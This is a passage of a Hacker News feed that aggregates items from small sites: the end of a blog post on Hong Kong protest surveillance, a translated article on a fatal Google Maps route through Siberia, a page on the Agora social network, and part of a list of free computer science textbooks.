<p>Hong Kong protesters also try to take down eyes on the crowd in the form of smart lampposts. There are a number of videos of them <a href="https://www.hongkongfp.com/2019/08/24/tear-gas-kwun-tong-hong-kong-protesters-surround-police-station-dismantle-surveillance-lampposts/">dismantling these lampposts</a> out of fear of surveillance.</p>
<p>For me it’s interesting to reflect on the news from Hong Kong because Hong Kong is a place I have visited over almost 30 years. During that time, I also lived there for around six years. Five of the visits and about one year of the living there was pre-Handover. In the time leading up to 1997, I observed (can’t really say I demonstrated) in a few events. These fell into a few types:</p>
<ul>
<li>Marches, often along Queen’s Road, in crowds in the tens of thousands or hundreds of thousands.</li>
<li>Sit-down demonstrations outside of the New China News Agency (the NCNA was the de facto Chinese embassy pre-Handover).</li>
<li>June 4th remembrances in Victoria Park (including the last pre-Handover one), often culminating in the crowd holding lit candles. <a href="https://www.youtube.com/watch?v=kYwsPt854Xo">Cui Jian’s <em>Nothing To My Name</em></a> would always be played (a song popular at 1989 Tiananmen).</li>
</ul>
<p>No one wore a mask, because there wasn’t any need to do so. The protest leaders were already known. The crowd was safe in numbers. I never heard anyone fear identification, even post-Handover.</p>
<p>If you contrast the protesters of back then with those of the last six months, they are unrecognizable.</p>
<p>That protesters hide their faces and cut down smart lampposts makes sense. Like the eyes in the advertisements above, the lampposts may not have any intent to use facial recognition to identify protesters, but there is no trust. Anything can look suspicious. If the capability is there to help your adversary, then you assume they use it. Especially if there are examples of mass surveillance already in place, for example in the Chinese province of <a href="https://unintendedconsequenc.es/uyghurs-xinjiang-onward-to-the-inevitable/">Xinjiang</a>.</p>
<h2>Consider</h2>
<ul>
<li>Identity at scale can weaken trust.</li>
<li>Visual symbols can spread a message.</li>
<li>Huang Yongyu’s owl paintings now sell at auction.</li>
</ul>
<!-- Begin Mailchimp Signup Form -->




<!--End mc_embed_signup-->	</div><!-- .entry-content -->

	 <!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://unintendedconsequenc.es/the-owls-right-eye/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25574623</guid>
            <pubDate>Tue, 29 Dec 2020 20:38:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Google Maps changes a route after the drama of young people lost on a ghost road]]>
            </title>
            <description>
<![CDATA[
Score 235 | Comments 305 (<a href="https://news.ycombinator.com/item?id=25574180">thread link</a>) | @f311a
<br/>
December 29, 2020 | https://tekdeeps.com/google-maps-changes-a-route-after-the-drama-of-young-people-lost-on-a-ghost-road/ | <a href="https://web.archive.org/web/*/https://tekdeeps.com/google-maps-changes-a-route-after-the-drama-of-young-people-lost-on-a-ghost-road/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id=""><p><span>Google Maps</span></p><figcaption>A point on the Russian Highway of Bones.</figcaption></div><div><p><a rel="nofollow" target="_blank" href="https://www.google.com/maps/place/Yakutsk,+Rep%C3%BAblica+de+Saj%C3%A1,+Rusia/@62.0314236,129.5617032,22380m/data=!3m2!1e3!4b1!4m5!3m4!1s0x5bf63939a0d2c47d:0x69b4c4b35cafa2fb!8m2!3d62.0396912!4d129.7422192">Google Maps</a> has been forced to change a route in the Russian Far East after a young man, Sergei Ustinov, was tragically frozen to death and his friend, Vladislav Istomin, was found in serious condition.</p><p>The two 18-year-old friends wanted to make the journey between Yakutsk, capital of the Republic of Sakha, in eastern Siberia, and Madagan.  2,000 kilometers and 34 hours by <a rel="nofollow" target="_blank" title="car" href="https://45.32.73.142/cars/">car</a> separate both cities.  Despite the minus 50ºC in that area during these dates, the young people decided to make the trip in their Toyota Chaser.</p><p>Ustinov went to Google Maps to tell him which was the fastest route: it came out as recommended <a rel="nofollow" target="_blank" href="https://es.wikipedia.org/wiki/Autopista_de_Kolim%C3%A1">the Kolimá highway or Highway of the Bones</a>.  It was three hours faster than the Russian Yandex browser told him.</p></div><div id=""><p><span>Google Maps</span></p><figcaption>The distance between both populations.</figcaption></div><div><p>This road, as reported by official documents, is located in one of the coldest areas in the world, where the populations of<strong> </strong>Oimiakón and Tomtor, considered the coldest inhabited places on the planet, since they have temperatures of down to minus 71.2 ° C in the middle of winter.</p><p>In addition, local media assure that it is a road that has been in disuse since the 70s where there is practically nothing.</p><p>On the way, a stick from a tree struck the radiator of the car, leaving both young men lying in their vehicle in the middle of nowhere.  They tried to make a small fire with the spare wheel rim, but it was not possible due to the cold.</p><p>This was explained to the local media by the official of the Russian Investigation Committee, Nadezhda Dvoretskaya: “The two young men tried to keep warm and burned a tire, but apparently they could not make a big fire because they could not remove the rest of the tires” .</p><p>Dvoretskaya did say that the young people had been able to communicate with their families, <a rel="nofollow" target="_blank" href="https://www.semana.com/mundo/articulo/final-tragico-para-un-joven-que-atendio-las-recomendaciones-de-google-maps/202013/">as reported in the Colombian newspaper <em>Week</em></a>.</p><p>When a rescue committee found them, Ustinov had already died as a result of the cold.  Istomin, who was in serious condition, was taken by helicopter to a hospital in the town of Ust-Nera. <a rel="nofollow" target="_blank" href="https://siberiantimes.com/other/others/news/tragedy-in-yakutia-as-man-18-freezes-to-death-inside-broken-down-car-on-road-of-bones-at-50c/">According to information from <em>Siberian Times</em></a>, had a frostbite on his arms and legs and is fighting to save his life.</p></div><hr><p><strong>Source:</strong> <a rel="nofollow" target="_blank" href="https://www.huffingtonpost.es/entry/google-maps-cambia-una-ruta-tras-el-drama-de-los-jovenes-perdidos-en-una-carretera-fantasma_es_5fe487bbc5b6acb534572e7a">Huffington Post Spain Athena2</a> <strong>by</strong> <a rel="nofollow" target="_blank" href="https://www.huffingtonpost.es/entry/google-maps-cambia-una-ruta-tras-el-drama-de-los-jovenes-perdidos-en-una-carretera-fantasma_es_5fe487bbc5b6acb534572e7a">www.huffingtonpost.es</a>.</p><p>*The article has been translated based on the content of <a rel="nofollow" target="_blank" href="https://www.huffingtonpost.es/entry/google-maps-cambia-una-ruta-tras-el-drama-de-los-jovenes-perdidos-en-una-carretera-fantasma_es_5fe487bbc5b6acb534572e7a">Huffington Post Spain Athena2</a> by <a rel="nofollow" target="_blank" href="https://www.huffingtonpost.es/entry/google-maps-cambia-una-ruta-tras-el-drama-de-los-jovenes-perdidos-en-una-carretera-fantasma_es_5fe487bbc5b6acb534572e7a">www.huffingtonpost.es</a>. If there is any problem regarding the content, copyright, please leave a report below the article. We will try to process as quickly as possible to protect the rights of the author. Thank you very much!</p><p>*We just want readers to access information more quickly and easily with other multilingual content, instead of information only available in a certain language.</p><p>*We always respect the copyright of the content of the author and always include the original link of the source article.If the author disagrees, just leave the report below the article, the article will be edited or deleted at the request of the author. Thanks very much! Best regards!</p><hr><div> <div><div><div><ul><li> <label for="input-reason-553565"> Issue: <span>*</span> </label><br> </li><li> <label for="input-name-553565"> Your Name: <span>*</span> </label><br> </li><li> <label for="input-email-553565"> Your Email: <span>*</span> </label><br> </li></ul></div> </div></div></div></div></div>]]>
            </description>
            <link>https://tekdeeps.com/google-maps-changes-a-route-after-the-drama-of-young-people-lost-on-a-ghost-road/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25574180</guid>
            <pubDate>Tue, 29 Dec 2020 20:06:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: The Agora – an experimental social network]]>
            </title>
            <description>
<![CDATA[
Score 60 | Comments 29 (<a href="https://news.ycombinator.com/item?id=25573523">thread link</a>) | @flancian
<br/>
December 29, 2020 | http://anagora.org/node/agora | <a href="https://web.archive.org/web/*/http://anagora.org/node/agora">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	




<div>
<div>
    
<ul>
<li><a href="https://anagora.org/" rel="nofollow">The Agora is a distributed knowledge graph and experimental social network</a>.<ul>
<li>As an Agora <em>guest</em> you can currently:<ul>
<li>Navigate the Agora, which is composed of <a href="http://anagora.org/node/nodes" rel="nofollow">nodes</a> which aggregate content from many users about the same topic or entity.</li>
<li>Make use of <a href="http://anagora.org/node/backlinks" rel="nofollow">backlinks</a> and <a href="http://anagora.org/node/pulled-nodes" rel="nofollow">pulled nodes</a> to discover relevant content.</li>
</ul>
</li>
<li>As an Agora <em>user</em> you can:<ul>
<li>Have your content be surfaced to readers at relevant times (when they are visiting a <a href="http://anagora.org/node/node" rel="nofollow">node</a> for which your content is considered relevant by the community).</li>
<li>Have relevant content be surfaced to you as you traverse your <a href="http://anagora.org/node/personal-knowledge-graph" rel="nofollow">personal knowledge graph</a>.</li>
<li>Make use of <a href="http://anagora.org/node/agora-actions" rel="nofollow">agora actions</a>.</li>
</ul>
</li>
<li>Anyone can run an Agora of their own if they so desire. This Agora is <a href="http://anagora.org/node/open-source" rel="nofollow">open source</a>.</li>
</ul>
</li>
<li>To <a href="http://anagora.org/node/sign-up" rel="nofollow">sign up</a> for the Agora, first you need to publish your <a href="http://anagora.org/node/digital-garden" rel="nofollow">digital garden</a> or <a href="http://anagora.org/node/content" rel="nofollow">content</a> elsewhere online. The Agora doesn't host your data, but rather pulls it from a location <em>you</em> control and renders it for you and other users; it interlinks your data with that of other users as you wish.<ul>
<li>If you know your way around <a href="http://anagora.org/node/git" rel="nofollow">git</a>, <a href="http://anagora.org/node/markdown" rel="nofollow">markdown</a> on git is the default format. If you use <a href="http://anagora.org/node/roam" rel="nofollow">roam</a> or a <a href="http://anagora.org/node/roam-like" rel="nofollow">roam like</a> or you have a notes database, you're almost there. Please refer to <a href="https://anagora.org/go/agora-howto" rel="nofollow">agora howto</a> for detailed instructions.</li>
<li>Whatever participation mechanism you choose, you can either send a <a href="http://anagora.org/node/pull-request" rel="nofollow">pull request</a> adding yourself to the repository or let an Agora <a href="http://anagora.org/node/maintainer" rel="nofollow">maintainer</a> know where your <a href="http://anagora.org/node/digital-garden" rel="nofollow">digital garden</a> or <a href="http://anagora.org/node/content" rel="nofollow">content</a> is, so it can be pulled by the Agora and <a href="http://anagora.org/node/integrated" rel="nofollow">integrated</a>. We strive to continuously support new sources and formats. Please send email to signup@anagora.org or <a href="https://twitter.com/flancian" rel="nofollow">tweet at me</a> with:<ul>
<li>The URL for your content.</li>
<li>Your desired username.</li>
</ul>
</li>
<li>The Agora wants to be <a href="http://anagora.org/node/maximally-inclusive" rel="nofollow">maximally inclusive</a>, but it is in its infancy; it is a <a href="http://anagora.org/node/work-in-progress" rel="nofollow">work in progress</a>. If you want to participate and can't, please also send email to signup@anagora.org to let us know.<ul>
<li>Through projects such as <a href="http://anagora.org/node/agora-twitter-integration" rel="nofollow">agora twitter integration</a>, we hope to make the Agora available to anyone that has access to a social network account.</li>
</ul>
</li>
<li>If you want to learn more about the <a href="http://anagora.org/node/experimental" rel="nofollow">experimental</a> nature of this Agora, please refer to <a href="https://news.ycombinator.com/item?id=25577016" rel="nofollow">this Hacker News comment</a>.</li>
<li>If you want to keep up to date with development, consider adding me on Twitter or Mastodon: <a href="http://anagora.org/node/flancian" rel="nofollow">flancian</a>.</li>
</ul>
</li>
<li>An Agora is, in its most basic form, a set of useful conventions.<ul>
<li>Useful conventions are made explicit through an Agora's <a href="http://anagora.org/node/contract" rel="nofollow">CONTRACT</a> and the writing of its users.</li>
<li>You can think of the Agora as a distributed <a href="http://anagora.org/node/sequential-wiki" rel="nofollow">sequential wiki</a>; an experiment in <a href="http://anagora.org/node/semantic-web" rel="nofollow">semantic web</a> <a href="http://anagora.org/node/applications" rel="nofollow">applications</a>.</li>
<li>An Agora is a <a href="http://anagora.org/node/distributed-knowledge-graph" rel="nofollow">distributed knowledge graph</a> maintained by the users of an experimental <a href="http://anagora.org/node/social-network" rel="nofollow">social network</a>.<ul>
<li>By <a href="http://anagora.org/node/you" rel="nofollow">you</a> and <a href="http://anagora.org/node/me" rel="nofollow">me</a>. Anyone can participate if they are willing.</li>
<li>Check out <a href="http://anagora.org/node/agora-howto" rel="nofollow">agora howto</a> (users) or <a href="http://anagora.org/node/agora-plan" rel="nofollow">agora plan</a> (developers) if you want to jump in.</li>
</ul>
</li>
</ul>
</li>
<li>This Agora tries to be a good <a href="http://anagora.org/node/internet-citizen" rel="nofollow">internet citizen</a>. <ul>
<li>The <a href="http://anagora.org/node/agora-protocol" rel="nofollow">agora protocol</a> is openly developed and can be implemented by anyone.</li>
<li>See also: <a href="http://anagora.org/node/wikilinks-everywhere" rel="nofollow">wikilinks everywhere</a>. </li>
</ul>
</li>
<li><a href="http://anagora.org/node/go" rel="nofollow">go</a> <a href="http://github.com/flancian/agora" rel="nofollow">github.com/flancian/agora</a></li>
<li><a href="http://anagora.org/node/pull" rel="nofollow">pull</a> <a href="http://anagora.org/node/agora-editor" rel="nofollow">agora editor</a></li>
<li>There are <a href="http://anagora.org/node/other-agoras" rel="nofollow">other agoras</a>.</li>
</ul>
</div>

<div>
    
<ul>
<li>[ ] build a tool to filter a json roam export for only nodes tagged with <code>\#public</code> <a href="http://anagora.org/node/roam2agora" rel="nofollow">roam2agora</a></li>
</ul>
</div>

<div>
    <p>An agora, in its broadest sense, is a conceptual space where people attempt to bring an increased level of intentionality, explicitness, and mutual agreement to the principles and protocols for interacting in that space. A further aspect of the idea of an Agora is that it is a space which enables collaboration. In particular, it is a space that allows for collaboration guided by specific shared interests, without requiring the co-consitutients of the agora to be aligned more fully or generally in terms of their intentions, values, etc. </p>
<p>Some topics that the idea of an Agora is related to: <a href="http://anagora.org/node/transparency" rel="nofollow">transparency</a> <a href="http://anagora.org/node/decentralized-structures" rel="nofollow">decentralized structures</a> <a href="http://anagora.org/node/egalitarian-principles" rel="nofollow">egalitarian principles</a> <a href="http://anagora.org/node/judgement" rel="nofollow">judgement</a> <a href="http://anagora.org/node/algorithms-of-interaction" rel="nofollow">algorithms of interaction</a> <a href="http://anagora.org/node/communication" rel="nofollow">communication</a> <a href="http://anagora.org/node/collaboration" rel="nofollow">collaboration</a> <a href="http://anagora.org/node/knowledge-sharing" rel="nofollow">knowledge sharing</a></p>
<p>There are (infinitely) many possible variants of how this idea might be implemented in concrete, real-world situations. For example, an agora could be a space that is opened up inside a conversation between two people. Or it could be a collaborative project that is accompanied by specified rules. Or it could be a collective agreement about how to handle certain types of situations. </p>
<p>One variant of the idea of an Agora is a place where personal notes are shared, with the common goal of pooling information and sharing knowledge. One implementation of this idea is <a href="https://anagora.org/" rel="nofollow">https://anagora.org</a>. See also <a href="https://flancia.org/go/agora" rel="nofollow">https://flancia.org/go/agora</a>.</p>
<p>The term "Agora" and the basic idea come from <a href="http://anagora.org/node/flancia" rel="nofollow">Flancia</a>. </p>
</div>



</div>






<!--
 Copyright 2020 Google LLC

 Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
 You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

 Unless required by applicable law or agreed to in writing, software
 distributed under the License is distributed on an "AS IS" BASIS,
 WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 See the License for the specific language governing permissions and
 limitations under the License.
-->




    </div></div>]]>
            </description>
            <link>http://anagora.org/node/agora</link>
            <guid isPermaLink="false">hacker-news-small-sites-25573523</guid>
            <pubDate>Tue, 29 Dec 2020 19:09:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Computer Science textbooks that are freely available online]]>
            </title>
            <description>
<![CDATA[
Score 488 | Comments 44 (<a href="https://news.ycombinator.com/item?id=25572852">thread link</a>) | @MrXOR
<br/>
December 29, 2020 | https://csgordon.github.io/books.html | <a href="https://web.archive.org/web/*/https://csgordon.github.io/books.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>




<div>


    

<p>Below is a loosely-categorized collection of links to CS textbooks in a variety of areas that are
freely available online, usually because they are one of the following:</p>

<ul>
  <li>An open textbook (such as PLAI, SF, or the HoTT book)</li>
  <li>An older book that is out of print, for which the copyright has returned to the original author(s)
(such as TTFP)</li>
  <li>An author’s own preprint or draft of a textbook.  This includes cases where the author has made
special arrangements with a publisher to host an electronic copy of a published text on their
homepage while it remains in print.</li>
</ul>

<p>Most of these I’ve only used for brief personal reference, and have not read in depth.  The exceptions, those books I’ve spent considerable time with and highly recommend, are marked with asterisks.</p>

<p>I also include below a list of papers I consider good stand-alone introductions to certain topics, and a list of links to thorough special topics courses.</p>

<p>If you find one of the links below is broken or has moved, feel free to let me know.</p>

<p>Those with time to spare and looking to have less of it may enjoy browsing the QA call numbers in <a href="http://onlinebooks.library.upenn.edu/">UPenn’s extensive listing of online books</a>.  Most of those listed here were found independently over the years, but I’ve just now (June 2020) learned of this excellent repository of links.  I’ll add to the links below as I find promising books.</p>

<h2 id="programming-language-theory--program-analysis-including-automata">Programming Language Theory &amp; Program Analysis (including Automata)</h2>
<p>Topics such as semantics, types, abstract interpretation, proof assistants…</p>

<ul>
  <li><a href="http://www.cis.upenn.edu/~bcpierce/sf/">Software Foundations</a></li>
  <li><a href="http://www.cs.cmu.edu/~rwh/plbook/">Practical Foundations for Programming Languages (draft)</a></li>
  <li><a href="http://www.cse.chalmers.se/research/group/logic/book/">Programming in Martin-Lof’s Type Theory</a></li>
  <li><a href="http://www.paultaylor.eu/stable/Proofs+Types.html">Proofs and Types</a></li>
  <li><a href="http://www.paultaylor.eu/~pt/prafm/">Practical Foundations of Mathematics</a></li>
  <li>*<a href="http://www.cs.brown.edu/~sk/Publications/Books/ProgLangs/">Programming Languages: Application and Interpretation</a>
  (second edition <a href="http://www.cs.brown.edu/courses/cs173/2012/book/">in progress</a>)</li>
  <li><a href="http://www.daimi.au.dk/~bra8130/Wiley_book/wiley.html">Semantics with Applications</a></li>
  <li><a href="http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.17.7385">Lectures on the Curry Howard Isomorphism (draft)</a></li>
  <li>*<a href="http://www.cs.kent.ac.uk/people/staff/sjt/TTFP/">Type Theory and Functional Programming</a></li>
  <li>*<a href="http://adam.chlipala.net/cpdt/">Certified Programming with Dependent Types</a></li>
  <li><a href="http://www21.in.tum.de/~nipkow/LNCS2283/">Isabelle/HOL: A Proof Assistant for Higher-Order Logic</a></li>
  <li><a href="http://www.usingcsp.com/">Communicating Sequential Processes</a></li>
  <li><a href="http://www.cs.cmu.edu/~jcr/craftprog.html">The Craft of Programming</a></li>
  <li><a href="http://people.cis.ksu.edu/~schmidt/text/densem.html">Denotational Semantics: A Methodology for Language Development</a></li>
  <li>*<a href="http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.26.4391">Lambda Calculi with Types</a></li>
  <li><a href="http://www.cs.ru.nl/~henk/book.pdf">Lambda Calculus with Types</a></li>
  <li><a href="http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.56.7045">Logics and Type Systems</a></li>
  <li><a href="http://www.cs.ox.ac.uk/publications/books/PfS/">Programming from Specifications</a></li>
  <li><a href="http://www.usingz.com/">Using Z: Specification, Refinement, and Proof</a></li>
  <li><a href="http://homotopytypetheory.org/book/">Homotopy Type Theory</a></li>
  <li><a href="http://www.itu.dk/~sestoft/pebook/">Partial Evaluation and Automatic Program Generation</a></li>
  <li><a href="http://www.nuprl.org/book/">Implementing Mathematics with The Nuprl Proof Development System</a></li>
  <li><a href="http://intuitionistic.files.wordpress.com/2010/07/martin-lof-tt.pdf">Intuitionistic Type Theory</a></li>
  <li><a href="http://www21.in.tum.de/~nipkow/Concrete-Semantics">Concrete Semantics</a></li>
  <li><a href="http://www602.math.ryukoku.ac.jp/~nakano/papers/index.html">PX: A Comuptational Logic</a></li>
  <li><a href="http://research.microsoft.com/en-us/um/people/lamport/tla/book.html">Specifying Systems: The TLA+ Language and Tools for Hardware and Software Engineers</a></li>
  <li>*<a href="http://cristal.inria.fr/attapl/">The Essence of ML Type Inference</a> 
  (Manuscript, Chapter 10 of <a href="http://www.cis.upenn.edu/~bcpierce/attapl/index.html">ATTAPL</a>)</li>
  <li><a href="http://cs.au.dk/~amoeller/spa/">Static Program Analysis</a></li>
  <li><a href="http://pl.cs.jhu.edu/pl/book/index.shtml">Principles of Programming Languages</a></li>
  <li><a href="https://manu.sridharan.net/files/aliasAnalysisChapter.pdf">Alias Analysis for Object-Oriented Programs”</a> 
  (Manuscript, chapter of <emph>Aliasing in Object-Oriented Programming</emph>)</li>
  <li><a href="https://yanniss.github.io/points-to-tutorial15.pdf">Pointer Analysis</a></li>
  <li><a href="http://tata.gforge.inria.fr/">Tree Automata Techniques and Applications</a></li>
  <li><a href="http://www.wisdom.weizmann.ac.il/~harel/reactive_systems.html">Modeling Reactive Systems with Statecharts: The STATEMATE Approach</a></li>
  <li>*<a href="https://www.cs.princeton.edu/~appel/papers/plcc.pdf">Program Logics for Certified Compilers</a></li>
  <li><a href="http://www.lix.polytechnique.fr/Labo/Samuel.Mimram/teaching/INF551/course.pdf">Program = Proof</a></li>
  <li><a href="https://www.cambridge.org/core/books/foundations-of-probabilistic-programming/819623B1B5B33836476618AC0621F0EE">Foundations of Probabilistic Programming</a></li>
</ul>

<h2 id="mathematical-logic-set-theory-model-theory-topology">Mathematical Logic, Set Theory, Model Theory, Topology</h2>

<p>This portion excludes category theory, which is now its own section below.</p>

<ul>
  <li><a href="http://tellerprimer.ucdavis.edu/">A Modern Formal Logic Primer</a></li>
  <li><a href="http://people.cohums.ohio-state.edu/tennant9/Natural_Logic.pdf">Natural Logic</a> (pdf)</li>
  <li><a href="http://www.math.cornell.edu/~hatcher/AT/ATpage.html">Algebraic Topology</a></li>
  <li><a href="http://www.math.uchicago.edu/~may/BOOKSMaster.html">A Concise Course in Algebraic Topology</a></li>
  <li><a href="http://www.math.toronto.edu/weiss/model_theory.html">Model Theory</a></li>
  <li><a href="http://www.math.toronto.edu/weiss/set_theory.html">Set Theory</a></li>
  <li><a href="http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.183.8564">An Introduction to Substructural Logics</a></li>
  <li><a href="http://homepages.mcs.vuw.ac.nz/~rob/papers/modalhist.pdf">Mathematical Modal Logic: A View of its Evolution</a></li>
  <li><a href="http://standish.stanford.edu/bin/detail?fileID=1705616123X">Normalization, Cut-Elimination, and the Theory of Proofs</a></li>
  <li><a href="http://standish.stanford.edu/bin/detail?fileID=1111907143">Logics of Time and Computation</a></li>
  <li><a href="http://standish.stanford.edu/bin/detail?fileID=1114665926">Mathematics of Modality</a></li>
  <li><a href="http://standish.stanford.edu/bin/detail?fileID=1766806333X">Modal Logic and Process Algebra: A Bisimulation Perspective</a></li>
  <li><a href="http://standish.stanford.edu/bin/detail?fileID=1791546586X">Lectures on Linear Logic</a></li>
  <li><a href="http://standish.stanford.edu/bin/detail?fileID=1710712960X">Dynamics, Polarity, and Quantification</a></li>
  <li><a href="http://standish.stanford.edu/bin/detail?fileID=1821513720X">Non-Well-Founded Sets</a></li>
  <li><a href="http://www.logicinaction.org/">Logic in Action</a></li>
  <li><a href="http://www1.chapman.edu/~jipsen/JipsenRoseVoL.html">Varieties of Lattices</a></li>
  <li><a href="http://wwwhomes.uni-bielefeld.de/mkracht/html/tools/index.html">Tools and Techniques in Modal Logic</a> (the page is in German; the download link is the actual PDF)</li>
  <li>*<a href="https://math.berkeley.edu/~gbergman/245/">An Invitation to General Algebra and Universal Constructions</a></li>
  <li><a href="https://www.math.uchicago.edu/~may/BOOKSMaster.html">A Concise Course in Algebraic Topology</a> (near the bottom)</li>
  <li><a href="https://library.oapen.org/handle/20.500.12657/35301">Logic and Automata: History and Perspectives</a></li>
  <li><a href="https://topology.pubpub.org/">Topology: A Categorical Approach</a></li>
</ul>

<h2 id="software-engineering-theory-and-practice">Software Engineering (Theory and Practice)</h2>

<ul>
  <li><a href="https://landing.google.com/sre/sre-book/toc/index.html">Site Reliability Engineering</a></li>
  <li><a href="https://landing.google.com/sre/workbook/toc/">The Site Reliability Workbook</a></li>
  <li>The Architecture of Open Source Applications project books:
    <ul>
      <li><a href="https://www.aosabook.org/en/index.html">The Architecture of Open Source Applications</a></li>
      <li><a href="https://www.aosabook.org/en/index.html">The Architecture of Open Source Applications, Vol. 2</a></li>
      <li><a href="https://www.aosabook.org/en/index.html">The Performance of Open Source Applications</a></li>
      <li><a href="https://www.aosabook.org/en/index.html">500 Lines or Less</a></li>
    </ul>
  </li>
  <li><a href="https://sttp.site/">Software Testing: From Theory to Practice</a> (NOTE: Often does not load for me)</li>
</ul>

<h2 id="category-theory-and-applications">Category Theory and Applications</h2>

<ul>
  <li><a href="http://www.tac.mta.ca/tac/reprints/articles/17/tr17abs.html">Abstract and Concrete Categories: The Joy of Cats</a></li>
  <li><a href="http://www.cs.man.ac.uk/~david/categories/">Computational Category Theory</a></li>
  <li><a href="http://www.tac.mta.ca/tac/reprints/articles/12/tr12abs.html">Toposes, Triples, and Theories</a></li>
  <li>*<a href="http://ebooks.library.cornell.edu/cgi/t/text/text-idx?c=math;idno=gold010">Topoi: The Categorical Analysis of Logic</a>
  (<a href="http://projecteuclid.org/euclid.bia/1403013939#toc">also at Project Euclid</a>)</li>
  <li><a href="http://www.di.ens.fr/users/longo/download.html">Categories, Types, and Structures</a></li>
  <li><a href="http://arxiv.org/abs/math/0305049/">Higher Operads, Higher Categories</a></li>
  <li><a href="ftp://ftp.math.mcgill.ca/barr/pdffiles/ctcs.pdf">Category Theory for Computing Science</a> [pdf]
  (<a href="ftp://ftp.math.mcgill.ca/barr/pdffiles/Index.html">Barr’s publications</a>)</li>
  <li><a href="http://www.math.mcgill.ca/barr/papers/sac.pdf">*-Autonomous Categories</a></li>
  <li><a href="http://www.cl.cam.ac.uk/~amp12/papers/catl/catl.pdf">Categorical Logic</a></li>
  <li><a href="http://www.tac.mta.ca/tac/reprints/articles/3/tr3abs.html">Abelian Categories</a></li>
  <li><a href="http://www.tac.mta.ca/tac/reprints/articles/1/tr1abs.html">Metric Spaces, Generalized Logic, and Closed Categories</a></li>
  <li><a href="http://www.lfcs.inf.ed.ac.uk/reports/92/ECS-LFCS-92-208/">An introduction to fibrations, topos theory, the effective topos and modest sets</a></li>
  <li><a href="http://www.math.harvard.edu/~eriehl/cathtpy.pdf">Categorical Homotopy Theory</a></li>
  <li><a href="http://arxiv.org/abs/1302.6946">Category Theory for Scientists</a> (Manuscript)</li>
  <li><a href="http://projecteuclid.org/euclid.bams/1183526392">Categorical Algebra</a> (technically a 1965 journal article from Bull. Amer. Math. Soc., 17(1):40–106, but up on Project Euclid.</li>
  <li>Higher Topos Theory: <a href="http://math.harvard.edu/~lurie/papers/croppedtopoi.pdf">Author version</a>,
  <a href="http://arxiv.org/abs/math/0608040">arXiv version</a></li>
  <li><a href="http://www.tac.mta.ca/tac/reprints/articles/10/tr10abs.html">Basic Concepts of Enriched Category Theory</a></li>
  <li>The online journal Theory and Applications of Categories archives electronic versions of some out of print category theory textbooks:  <a href="http://www.tac.mta.ca/tac/reprints/index.html">Reprints in Theory and Applications of Categories</a></li>
  <li><a href="https://bartoszmilewski.com/2014/10/28/category-theory-for-programmers-the-preface/">Category Theory for Programmers</a></li>
  <li><a href="http://www.mathematik.uni-regensburg.de/cisinski/CatLR.pdf">Higher Categories and Homotopical Algebra</a> author preprint</li>
  <li><a href="http://www.math.mcgill.ca/barr/papers/sac.pdf">*-Autonomous Categories</a></li>
  <li><a href="https://arxiv.org/abs/2002.06055">2-Dimensional Categories</a></li>
  <li><a href="https://reyes-reyes.com/2018/04/02/first-order-categorical-logic-2/">First-Order Categorical Logic</a></li>
  <li><a href="https://reyes-reyes.com/2004/06/01/generic-figures-and-their-glueings-a-constructive-approach-to-functor-categories/">Generic Figures and Their Glueings: A Constructive Approach to Functor Categories</a></li>
  <li><a href="http://www.math.jhu.edu/~eriehl/context.pdf">Category Theory in Context</a></li>
</ul>

<h2 id="language-implementation">Language Implementation</h2>

<ul>
  <li><a href="http://research.microsoft.com/en-us/um/people/simonpj/Papers/pj-lester-book/">Implementing Functional Languages: A Tutorial</a></li>
  <li><a href="http://research.microsoft.com/en-us/um/people/simonpj/papers/slpj-book-1987/">The Implementation of Functional Programming Languages</a></li>
  <li><a href="http://callvirt.net/blog/files/Shared%20Source%20CLI%202.0%20Internals.pdf">Shared Source CLI 2.0 Internals</a> 
  (<a href="http://callvirt.net/blog/post/SSCLI-20-Patch-for-VS-2010.aspx">shelved draft</a>)</li>
  <li><a href="http://wiki.squeak.org/squeak/64">Smalltalk-80: The Language and its Implementation</a> (a.k.a. “The Blue Book”)</li>
  <li><a href="http://dippl.org/">The Design and Implementation of Probabilistic Programming Languages</a></li>
</ul>

<h2 id="systems--networking-including-security-architecture">Systems &amp; Networking (including Security, Architecture)</h2>

<ul>
  <li>*<a href="https://www.aosabook.org/en/index.html">A Commentary on the Sixth Edition UNIX Operating System</a> (and <a href="http://v6.cuzuco.com/">UNIX v6 source code</a>)</li>
  <li><a href="https://www.distributed-systems.net/index.php/books/distributed-systems-3rd-edition-2017/">Distributed Systems, 3rd Edition</a> by van Steen and Tanenbaum</li>
  <li><a href="http://www.iecc.com/linker/">Linkers and Loaders</a></li>
  <li><a href="http://research.microsoft.com/en-us/people/philbe/ccontrol.aspx">Concurrency Control and Recovery in Database Systems</a></li>
  <li><a href="https://www.kernel.org/pub/linux/kernel/people/paulmck/perfbook/perfbook.html">Is Parallel Programming Hard, And, If So, What Can You Do About It?</a></li>
  <li><a href="http://pages.cs.wisc.edu/~remzi/OSTEP/">Operating Systems: Three Easy Pieces</a></li>
  <li><a href="http://www.tcpipguide.com/">The TCP/IP Guide</a></li>
  <li><a href="http://cs-www.cs.yale.edu/homes/aspnes/classes/465/notes.pdf">Notes on Theory of Distributed Systems, CPSC 465/565</a> (technically notes, but in practice an excellent textbook)</li>
  <li>*<a href="http://www.nobius.org/~dbg/practical-file-system-design.pdf">Practical File System Design with the Be File System</a></li>
